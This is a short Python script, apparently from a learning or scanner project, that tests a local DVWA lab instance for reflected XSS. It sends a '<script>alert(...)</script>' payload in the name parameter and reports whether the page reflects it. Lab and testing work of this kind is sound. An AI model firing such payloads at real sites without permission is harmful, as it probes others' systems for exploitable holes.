import requests
from Helpers import helper_dvwa
from Helpers import helper_generic_tags
from Attack import base_attack

BASE_URL = "http://127.0.0.1:80/DVWA"
SCRIPT = "<script>alert('XSS')</script>"
INJECT_DATA = {"name": SCRIPT, "submit": "Submit"}
COOKIES_JSON = {
    "PHPSESSID": helper_dvwa.DVWA.get_user_token(f"{BASE_URL}/login.php"),
    "security": "low"
}


class XSS(base_attack.Attack):

    def __init__(self, url):
        super().__init__(url)

    @staticmethod
    def main():
        # TODO: elad removed this unused lines (20, 27)
        with requests.Session() as sess:
            sess.cookies.update(COOKIES_JSON)

            # Pass the login page: "http://127.0.0.1:80/DVWA/index.php"
            index_page_response = sess.get(f"{BASE_URL}/index.php")

            # Entering to xss reflected page : "http://127.0.0.1:80/DVWA/vulnerabilities/xss_r"
            xss_r_page = sess.get(f"{BASE_URL}/vulnerabilities/xss_r/")

            # To see the structure of the data we need to send:
            ls_forms = helper_generic_tags.GetGenericTags.get_tags(xss_r_page.text, "form", {})

            # Inserting the data and in put the script in the name filed:
            res = sess.get(f"{BASE_URL}/vulnerabilities/xss_r/", params=INJECT_DATA)

            # Check if the script saved in the website:
            if SCRIPT in res.text:
                print("Your website is vulnerable to XSS Injection attack!")
            else:
                print("Your website is NOT vulnerable to XSS Injection attack.")


if __name__ == "__main__":
    XSS.main()
